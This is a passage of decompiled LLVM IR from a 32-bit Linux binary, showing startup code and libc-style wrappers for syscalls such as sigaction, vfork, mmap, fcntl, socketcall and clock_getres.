  br i1 %v1_804ed4c, label %dec_label_pc_804ed46, label %dec_label_pc_804ed6d.preheader

dec_label_pc_804ed6d.preheader:                   ; preds = %dec_label_pc_804ed46
  store i32 %v1_804ed49, i32* @ebx, align 4
  %v1_804ed6d1 = inttoptr i32 %v1_804ed49 to i32*
  %v2_804ed6d2 = load i32, i32* %v1_804ed6d1, align 4
  %v3_804ed6d3 = icmp eq i32 %v2_804ed6d2, 0
  %v1_804ed7010 = icmp eq i1 %v3_804ed6d3, false
  br i1 %v1_804ed7010, label %dec_label_pc_804ed52.lr.ph, label %dec_label_pc_804ed72

dec_label_pc_804ed52.lr.ph:                       ; preds = %dec_label_pc_804ed6d.preheader
  %v3_804ed32 = ptrtoint i32* %stack_var_-168 to i32
  %v3_804ed5d = add i32 %v3_804ed32, 32
  br label %dec_label_pc_804ed52

dec_label_pc_804ed52:                             ; preds = %dec_label_pc_804ed52.lr.ph, %dec_label_pc_804ed6a
  %v1_804ed5d = phi i32 [ %v2_804ed6d2, %dec_label_pc_804ed52.lr.ph ], [ %v2_804ed6d, %dec_label_pc_804ed6a ]
  %v0_804ed5c = phi i32 [ %v1_804ed49, %dec_label_pc_804ed52.lr.ph ], [ %v1_804ed6a, %dec_label_pc_804ed6a ]
  %v6_804ed57 = icmp ugt i32 %v1_804ed5d, 14
  br i1 %v6_804ed57, label %dec_label_pc_804ed6a, label %dec_label_pc_804ed59

dec_label_pc_804ed59:                             ; preds = %dec_label_pc_804ed52
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_804ed5c, i32* %stack_var_-168, align 4
  %v2_804ed5d = mul i32 %v1_804ed5d, 8
  %v4_804ed5d = add i32 %v3_804ed5d, %v2_804ed5d
  %v3_804ed62 = inttoptr i32 %v4_804ed5d to i16*
  %v4_804ed62 = call i32 @function_804ce38(i16* %v3_804ed62, i32 %v0_804ed5c, i32 8)
  %v0_804ed6a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ed6a

dec_label_pc_804ed6a:                             ; preds = %dec_label_pc_804ed52, %dec_label_pc_804ed59
  %v0_804ed6a = phi i32 [ %v0_804ed5c, %dec_label_pc_804ed52 ], [ %v0_804ed6a.pre, %dec_label_pc_804ed59 ]
  %v1_804ed6a = add i32 %v0_804ed6a, 8
  store i32 %v1_804ed6a, i32* @ebx, align 4
  %v1_804ed6d = inttoptr i32 %v1_804ed6a to i32*
  %v2_804ed6d = load i32, i32* %v1_804ed6d, align 4
  %v3_804ed6d = icmp eq i32 %v2_804ed6d, 0
  %v1_804ed70 = icmp eq i1 %v3_804ed6d, false
  br i1 %v1_804ed70, label %dec_label_pc_804ed52, label %dec_label_pc_804ed72

dec_label_pc_804ed72:                             ; preds = %dec_label_pc_804ed6a, %dec_label_pc_804ed6d.preheader
  store i32 %v2_804ed34, i32* @eax, align 4
  %v0_804ed76 = call i32 @function_8050c68()
  store i32 %v0_804ed76, i32* @eax, align 4
  %v0_804ed7b = call i32 @function_804eca3()
  %v1_804ed84 = icmp eq i32 %tmp26, 0
  %v1_804ed86 = icmp eq i1 %v1_804ed84, false
  br i1 %v1_804ed86, label %dec_label_pc_804ed8c, label %dec_label_pc_804ed88

dec_label_pc_804ed88:                             ; preds = %dec_label_pc_804ed72
  %v1_804ed88 = and i32 %tmp26, -65536
  %v2_804ed88 = or i32 %v1_804ed88, 4096
  br label %dec_label_pc_804ed8c

dec_label_pc_804ed8c:                             ; preds = %dec_label_pc_804ed72, %dec_label_pc_804ed88
  %v0_804ed8c = phi i32 [ %tmp26, %dec_label_pc_804ed72 ], [ %v2_804ed88, %dec_label_pc_804ed88 ]
  store i32 %v0_804ed8c, i32* @global_var_80580b0.179, align 16
  %v13_804ed91 = icmp eq i32 %tmp25, -1
  %v1_804ed96 = icmp eq i1 %v13_804ed91, false
  br i1 %v1_804ed96, label %dec_label_pc_804edc1, label %dec_label_pc_804ed98

dec_label_pc_804ed98:                             ; preds = %dec_label_pc_804ed8c
  %v0_804ed98 = call i32 @function_804f270()
  store i32 %v0_804ed98, i32* @ebx, align 4
  %v0_804ed9f = call i32 @function_804f1d8()
  %v0_804eda4 = load i32, i32* @ebx, align 4
  %v12_804eda4 = icmp eq i32 %v0_804eda4, %v0_804ed9f
  %v1_804eda6 = icmp eq i1 %v12_804eda4, false
  br i1 %v1_804eda6, label %dec_label_pc_804edd7, label %dec_label_pc_804eda8

dec_label_pc_804eda8:                             ; preds = %dec_label_pc_804ed98
  %v0_804eda8 = call i32 @function_804f200()
  store i32 %v0_804eda8, i32* @ebx, align 4
  %v0_804edaf = call i32 @function_804f1b0()
  %v0_804edb4 = load i32, i32* @ebx, align 4
  %v12_804edb4 = icmp eq i32 %v0_804edb4, %v0_804edaf
  %v1_804edb6 = icmp eq i1 %v12_804edb4, false
  br i1 %v1_804edb6, label %dec_label_pc_804edd7, label %dec_label_pc_804edb8.thread

dec_label_pc_804edb8.thread:                      ; preds = %dec_label_pc_804eda8
  br label %dec_label_pc_804ee01

dec_label_pc_804edc1:                             ; preds = %dec_label_pc_804ed8c
  %v15_804edc1 = icmp eq i32 %tmp25, %tmp24
  %v1_804edc5 = icmp eq i1 %v15_804edc1, false
  br i1 %v1_804edc5, label %dec_label_pc_804edd7, label %dec_label_pc_804edc7

dec_label_pc_804edc7:                             ; preds = %dec_label_pc_804edc1
  br label %dec_label_pc_804edd7

dec_label_pc_804edd7:                             ; preds = %dec_label_pc_804edc7, %dec_label_pc_804edc1, %dec_label_pc_804eda8, %dec_label_pc_804ed98
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804edde = call i32 @function_804ec6f()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804eded = call i32 @function_804ec6f()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804edfc = call i32 @function_804ec6f()
  br label %dec_label_pc_804ee01

dec_label_pc_804ee01:                             ; preds = %dec_label_pc_804edb8.thread, %dec_label_pc_804edd7
  store i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32* %esi.global-to-local, align 4
  %v0_804ee06 = load i32, i32* @edi, align 4
  %v1_804ee06 = inttoptr i32 %v0_804ee06 to i32*
  %v2_804ee06 = load i32, i32* %v1_804ee06, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32* %esi.global-to-local, align 4
  store i32 %v2_804ee06, i32* inttoptr (i32 134568408 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80580b4.175, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567493), i32 6), label %dec_label_pc_804ee26, label %dec_label_pc_804ee32

dec_label_pc_804ee26:                             ; preds = %dec_label_pc_804ee01, %dec_label_pc_804ee26
  %v4_804ee2647 = phi i32 [ %v1_804ee2d, %dec_label_pc_804ee26 ], [ 0, %dec_label_pc_804ee01 ]
  store i32 ptrtoint (i32* @global_var_804ee2d.182 to i32), i32* %stack_var_-164, align 4
  %v5_804ee26 = mul i32 %v4_804ee2647, 4
  %v6_804ee26 = add i32 %v5_804ee26, ptrtoint (i32* @global_var_8055648.173 to i32)
  %v7_804ee26 = inttoptr i32 %v6_804ee26 to i32*
  %v8_804ee26 = load i32, i32* %v7_804ee26, align 4
  call void @__pseudo_call(i32 %v8_804ee26)
  %v0_804ee2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ee2d = add i32 %v0_804ee2d, 1
  store i32 %v1_804ee2d, i32* %ebx.global-to-local, align 4
  %v1_804ee2e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804ee2e = icmp ult i32 %v1_804ee2d, %v1_804ee2e.pre
  br i1 %v7_804ee2e, label %dec_label_pc_804ee26, label %dec_label_pc_804ee32

dec_label_pc_804ee32:                             ; preds = %dec_label_pc_804ee26, %dec_label_pc_804ee01
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32 2), i32 0), label %dec_label_pc_804ee4a, label %dec_label_pc_804ee56

dec_label_pc_804ee4a:                             ; preds = %dec_label_pc_804ee32, %dec_label_pc_804ee4a
  %v4_804ee4a44 = phi i32 [ %v1_804ee51, %dec_label_pc_804ee4a ], [ 0, %dec_label_pc_804ee32 ]
  store i32 ptrtoint (i32* @global_var_804ee51.183 to i32), i32* %stack_var_-164, align 4
  %v5_804ee4a = mul i32 %v4_804ee4a44, 4
  %v6_804ee4a = add i32 %v5_804ee4a, ptrtoint (i32* @global_var_8055648.173 to i32)
  %v7_804ee4a = inttoptr i32 %v6_804ee4a to i32*
  %v8_804ee4a = load i32, i32* %v7_804ee4a, align 4
  call void @__pseudo_call(i32 %v8_804ee4a)
  %v0_804ee51 = load i32, i32* @ebx, align 4
  %v1_804ee51 = add i32 %v0_804ee51, 1
  store i32 %v1_804ee51, i32* @ebx, align 4
  %v1_804ee52.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804ee52 = icmp ult i32 %v1_804ee51, %v1_804ee52.pre
  br i1 %v7_804ee52, label %dec_label_pc_804ee4a, label %dec_label_pc_804ee56

dec_label_pc_804ee56:                             ; preds = %dec_label_pc_804ee4a, %dec_label_pc_804ee32
  %v0_804ee5f = load i32, i32* %stack_var_-164, align 4
  %v1_804ee5f = call i32 @function_804b4bc(i32 %v0_804ee5f)
  %v1_804ee64 = inttoptr i32 %v1_804ee5f to i32*
  store i32 0, i32* %v1_804ee64, align 4
  %v0_804ee73 = call i32 @function_804f478()
  store i32 %v0_804ee73, i32* @eax, align 4
  %v1_804ee78 = inttoptr i32 %v0_804ee73 to i32*
  store i32 0, i32* %v1_804ee78, align 4
  %v0_804ee7f = load i32, i32* @global_var_80580ac.171, align 4
  store i32 %v0_804ee7f, i32* %stack_var_-164, align 4
  %v0_804ee85 = load i32, i32* @edi, align 4
  store i32 %v0_804ee85, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_804ee94 = load i32, i32* @eax, align 4
  %v1_804ee97 = call i32 @function_804e884(i32 %v0_804ee94)
  %v0_804eea1 = load i32, i32* @ebx, align 4
  %v1_804eea1 = inttoptr i32 %v0_804eea1 to %sigcontext*
  %v2_804eea1 = call i32 @sigreturn(%sigcontext* %v1_804eea1)
  %v0_804eea9 = load i32, i32* @ebx, align 4
  %v1_804eea9 = inttoptr i32 %v0_804eea9 to %sigcontext*
  %v2_804eea9 = call i32 @sigreturn(%sigcontext* %v1_804eea9)
  ret i32 %v2_804eea9

; uselistorder directives
  uselistorder i32 %v1_804ee51, { 1, 2, 0 }
  uselistorder i32 %v1_804ee2d, { 1, 2, 0 }
  uselistorder i32 %v2_804ed6d, { 1, 0 }
  uselistorder i32 %v1_804ed6a, { 2, 1, 0 }
  uselistorder i32 %v1_804ed49, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804ed46, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_804e884, { 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), { 0, 2, 1 }
  uselistorder i32 ()* @function_804ec6f, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804ee4a, { 1, 0 }
  uselistorder label %dec_label_pc_804ee26, { 1, 0 }
  uselistorder label %dec_label_pc_804ee01, { 1, 0 }
  uselistorder label %dec_label_pc_804ed8c, { 1, 0 }
  uselistorder label %dec_label_pc_804ed6a, { 1, 0 }
  uselistorder label %dec_label_pc_804ed52, { 1, 0 }
  uselistorder label %dec_label_pc_804ed2f, { 1, 0 }
}

define i32 @function_804eeab(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804eeab:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804eeab = load i32, i32* @esi, align 4
  %v0_804eeac = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804eec1 = icmp eq i32* %arg2, null
  br i1 %v1_804eec1, label %dec_label_pc_804ef14, label %dec_label_pc_804eec5

dec_label_pc_804eec5:                             ; preds = %dec_label_pc_804eeab
  %v2_804eec5 = load i32, i32* %arg2, align 4
  store i32 %v2_804eec5, i32* %stack_var_-148, align 4
  %v1_804eece = add i32 %tmp11, 4
  %v3_804eee0 = bitcast i32* %stack_var_-136 to i16*
  %v4_804eee0 = call i32 @function_804ce38(i16* %v3_804eee0, i32 %v1_804eece, i32 128)
  %v1_804eee5 = add i32 %tmp11, 132
  %v2_804eeff = inttoptr i32 %v1_804eee5 to i8*
  %v3_804eeff = load i8, i8* %v2_804eeff, align 1
  %v4_804eeff = and i8 %v3_804eeff, 4
  %v5_804eeff = icmp eq i8 %v4_804eeff, 0
  %v1_804ef06 = icmp eq i1 %v5_804eeff, false
  br i1 %v1_804ef06, label %dec_label_pc_804ef14, label %dec_label_pc_804ef08

dec_label_pc_804ef08:                             ; preds = %dec_label_pc_804eec5
  br label %dec_label_pc_804ef14

dec_label_pc_804ef14:                             ; preds = %dec_label_pc_804ef08, %dec_label_pc_804eec5, %dec_label_pc_804eeab
  %v1_804ef16 = icmp eq i32 %arg3, 0
  br i1 %v1_804ef16, label %dec_label_pc_804ef1e, label %dec_label_pc_804ef1a

dec_label_pc_804ef1a:                             ; preds = %dec_label_pc_804ef14
  %v2_804ef1a = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804ef1e

dec_label_pc_804ef1e:                             ; preds = %dec_label_pc_804ef14, %dec_label_pc_804ef1a
  %v0_804ef2d = phi i32 [ 0, %dec_label_pc_804ef14 ], [ %v2_804ef1a, %dec_label_pc_804ef1a ]
  br i1 %v1_804eec1, label %dec_label_pc_804ef2b, label %dec_label_pc_804ef24

dec_label_pc_804ef24:                             ; preds = %dec_label_pc_804ef1e
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804ef2b

dec_label_pc_804ef2b:                             ; preds = %dec_label_pc_804ef1e, %dec_label_pc_804ef24
  %v0_804ef2e = phi %sigaction* [ null, %dec_label_pc_804ef1e ], [ %phitmp, %dec_label_pc_804ef24 ]
  %v5_804ef36 = call i32 @function_804f084(i32 %arg1, %sigaction* %v0_804ef2e, i32 %v0_804ef2d, i32 8)
  store i32 %v5_804ef36, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ef16, label %dec_label_pc_804ef79, label %dec_label_pc_804ef44

dec_label_pc_804ef44:                             ; preds = %dec_label_pc_804ef2b
  %v2_804ef44 = icmp slt i32 %v5_804ef36, 0
  br i1 %v2_804ef44, label %dec_label_pc_804ef79, label %dec_label_pc_804ef48

dec_label_pc_804ef48:                             ; preds = %dec_label_pc_804ef44
  %v3_804ef48 = load i32, i32* %stack_var_-288, align 4
  %v2_804ef4c = inttoptr i32 %arg3 to i32*
  store i32 %v3_804ef48, i32* %v2_804ef4c, align 4
  %v2_804ef54 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804ef59 = add i32 %arg3, 4
  %v3_804ef5d = inttoptr i32 %v1_804ef59 to i16*
  %v4_804ef5d = call i32 @function_804ce38(i16* %v3_804ef5d, i32 %v2_804ef54, i32 128)
  %v2_804ef66 = add i32 %arg3, 132
  %v3_804ef66 = inttoptr i32 %v2_804ef66 to i32*
  %v2_804ef73 = add i32 %arg3, 136
  %v3_804ef73 = inttoptr i32 %v2_804ef73 to i32*
  %v0_804ef79.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ef79

dec_label_pc_804ef79:                             ; preds = %dec_label_pc_804ef44, %dec_label_pc_804ef2b, %dec_label_pc_804ef48
  %v0_804ef79 = phi i32 [ %v5_804ef36, %dec_label_pc_804ef44 ], [ %v5_804ef36, %dec_label_pc_804ef2b ], [ %v0_804ef79.pre, %dec_label_pc_804ef48 ]
  store i32 %v0_804eeac, i32* @ebx, align 4
  store i32 %v0_804eeab, i32* @esi, align 4
  ret i32 %v0_804ef79

; uselistorder directives
  uselistorder i32 %v5_804ef36, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804ef16, { 1, 0 }
  uselistorder i1 %v1_804eec1, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804ef79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef2b, { 1, 0 }
  uselistorder label %dec_label_pc_804ef1e, { 1, 0 }
}

define i32 @function_804ef84() local_unnamed_addr {
dec_label_pc_804ef84:
  %v0_804ef8a = call i32 @vfork()
  %v5_804ef8d = icmp ult i32 %v0_804ef8a, -4095
  %v1_804ef92 = icmp eq i1 %v5_804ef8d, false
  call void @__pseudo_cond_branch(i1 %v1_804ef92, i32 134548660)
  ret i32 %v0_804ef8a
}

define i32 @function_804ef9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804ef9c:
  %stack_var_4 = alloca i32, align 4
  %v0_804ef9c = load i32, i32* @ebx, align 4
  store i32 %v0_804ef9c, i32* @edx, align 4
  %v2_804efa7 = load i32, i32* @ecx, align 4
  %v4_804efa7 = load i32, i32* @esi, align 4
  %v5_804efa7 = load i32, i32* @edi, align 4
  %v6_804efa7 = load i32, i32* @ebp, align 4
  %v7_804efa7 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_804efa7, i32 %v0_804ef9c, i32 %v4_804efa7, i32 %v5_804efa7, i32 %v6_804efa7)
  %v8_804efa7 = ptrtoint i32* %v7_804efa7 to i32
  store i32 %v0_804ef9c, i32* @ebx, align 4
  %v3_804efb0 = icmp ugt i32* %v7_804efa7, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_804efb0, i32 134548660)
  ret i32 %v8_804efa7

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134548660, { 1, 0 }
}

define i32 @function_804efb8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804efb8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804efb8 = load i32, i32* @ebx, align 4
  store i32 %v0_804efb8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804efcb = call i32 @int80_syscall(i32 102)
  store i32 %v1_804efcb, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804efcb, -4095
  br i1 %tmp8, label %dec_label_pc_804efe4, label %dec_label_pc_804efd8

dec_label_pc_804efd8:                             ; preds = %dec_label_pc_804efb8
  %v0_804efd8 = load i32, i32* %stack_var_-4, align 4
  %v1_804efd8 = call i32 @function_804b4bc(i32 %v0_804efd8)
  %v0_804efdd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804efdd = sub i32 0, %v0_804efdd
  %v2_804efdf = inttoptr i32 %v1_804efd8 to i32*
  store i32 %v1_804efdd, i32* %v2_804efdf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804efe4

dec_label_pc_804efe4:                             ; preds = %dec_label_pc_804efb8, %dec_label_pc_804efd8
  %v0_804efe4 = phi i32 [ %v1_804efcb, %dec_label_pc_804efb8 ], [ -1, %dec_label_pc_804efd8 ]
  %v2_804efe6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804efe6, i32* @edx, align 4
  %v2_804efe8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804efe8, i32* @ebx, align 4
  ret i32 %v0_804efe4

; uselistorder directives
  uselistorder i32 %v1_804efcb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804efe4, { 1, 0 }
}

define i32 @function_804efec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804efec:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804efec = load i32, i32* @edi, align 4
  %v0_804efed = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804f001 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804f00b = icmp ugt i32 %v1_804f001, 2
  br i1 %v6_804f00b, label %dec_label_pc_804f01b, label %dec_label_pc_804f00d

dec_label_pc_804f00d:                             ; preds = %dec_label_pc_804efec
  %v4_804f011 = call i32 @function_804f044(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804f001)
  br label %dec_label_pc_804f03d

dec_label_pc_804f01b:                             ; preds = %dec_label_pc_804efec
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f023 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804f023, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804f023, -4095
  br i1 %tmp17, label %dec_label_pc_804f03b, label %dec_label_pc_804f02f

dec_label_pc_804f02f:                             ; preds = %dec_label_pc_804f01b
  %v1_804f02f = call i32 @function_804b4bc(i32 %v0_804efed)
  %v0_804f034 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f034 = sub i32 0, %v0_804f034
  %v2_804f036 = inttoptr i32 %v1_804f02f to i32*
  store i32 %v1_804f034, i32* %v2_804f036, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f03b

dec_label_pc_804f03b:                             ; preds = %dec_label_pc_804f01b, %dec_label_pc_804f02f
  %v0_804f03b = phi i32 [ %v2_804f023, %dec_label_pc_804f01b ], [ -1, %dec_label_pc_804f02f ]
  br label %dec_label_pc_804f03d

dec_label_pc_804f03d:                             ; preds = %dec_label_pc_804f00d, %dec_label_pc_804f03b
  %v0_804f042 = phi i32 [ %v4_804f011, %dec_label_pc_804f00d ], [ %v0_804f03b, %dec_label_pc_804f03b ]
  store i32 %v0_804efed, i32* @ebx, align 4
  store i32 %v0_804efec, i32* @edi, align 4
  ret i32 %v0_804f042

; uselistorder directives
  uselistorder i32 %v2_804f023, { 1, 0, 2 }
  uselistorder i32 %v0_804efed, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f03d, { 1, 0 }
  uselistorder label %dec_label_pc_804f03b, { 1, 0 }
}

define i32 @function_804f044(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f044:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f044 = load i32, i32* @edi, align 4
  store i32 %v0_804f044, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804f05c = load i32, i32* @ebx, align 4
  %v1_804f064 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804f064, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804f064, -4095
  br i1 %tmp11, label %dec_label_pc_804f07c, label %dec_label_pc_804f070

dec_label_pc_804f070:                             ; preds = %dec_label_pc_804f044
  %v1_804f070 = call i32 @function_804b4bc(i32 %v0_804f05c)
  %v0_804f075 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f075 = sub i32 0, %v0_804f075
  %v2_804f077 = inttoptr i32 %v1_804f070 to i32*
  store i32 %v1_804f075, i32* %v2_804f077, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f07c

dec_label_pc_804f07c:                             ; preds = %dec_label_pc_804f044, %dec_label_pc_804f070
  %v0_804f07c = phi i32 [ %v1_804f064, %dec_label_pc_804f044 ], [ -1, %dec_label_pc_804f070 ]
  %v2_804f081 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f081, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f07c

; uselistorder directives
  uselistorder i32 %v1_804f064, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f07c, { 1, 0 }
}

define i32 @function_804f084(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f084:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804f085 = load i32, i32* @esi, align 4
  store i32 %v0_804f085, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804f099 = load i32, i32* @ebx, align 4
  %v7_804f0a1 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804f0a1, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804f0a1, -4095
  br i1 %tmp13, label %dec_label_pc_804f0b9, label %dec_label_pc_804f0ad

dec_label_pc_804f0ad:                             ; preds = %dec_label_pc_804f084
  %v1_804f0ad = call i32 @function_804b4bc(i32 %v0_804f099)
  %v0_804f0b2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f0b2 = sub i32 0, %v0_804f0b2
  %v2_804f0b4 = inttoptr i32 %v1_804f0ad to i32*
  store i32 %v1_804f0b2, i32* %v2_804f0b4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f0b9

dec_label_pc_804f0b9:                             ; preds = %dec_label_pc_804f084, %dec_label_pc_804f0ad
  %v0_804f0b9 = phi i32 [ %v7_804f0a1, %dec_label_pc_804f084 ], [ -1, %dec_label_pc_804f0ad ]
  %v2_804f0bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f0bc, i32* @esi, align 4
  ret i32 %v0_804f0b9

; uselistorder directives
  uselistorder i32 %v7_804f0a1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f0b9, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_804f0c0(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_804f0c0:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_804f0e8(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f0e8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f0e8 = load i32, i32* @ebx, align 4
  store i32 %v0_804f0e8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804f0fb = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804f0fb, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_804f0fb, -4095
  br i1 %tmp9, label %dec_label_pc_804f114, label %dec_label_pc_804f108

dec_label_pc_804f108:                             ; preds = %dec_label_pc_804f0e8
  %v0_804f108 = load i32, i32* %stack_var_-4, align 4
  %v1_804f108 = call i32 @function_804b4bc(i32 %v0_804f108)
  %v0_804f10d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f10d = sub i32 0, %v0_804f10d
  %v2_804f10f = inttoptr i32 %v1_804f108 to i32*
  store i32 %v1_804f10d, i32* %v2_804f10f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f114

dec_label_pc_804f114:                             ; preds = %dec_label_pc_804f0e8, %dec_label_pc_804f108
  %v0_804f114 = phi i32 [ %v4_804f0fb, %dec_label_pc_804f0e8 ], [ -1, %dec_label_pc_804f108 ]
  %v2_804f116 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f116, i32* @edx, align 4
  %v2_804f118 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f118, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f114

; uselistorder directives
  uselistorder i32 %v4_804f0fb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f114, { 1, 0 }
}

define i32 @function_804f11c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f11c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f11c = load i32, i32* @ebx, align 4
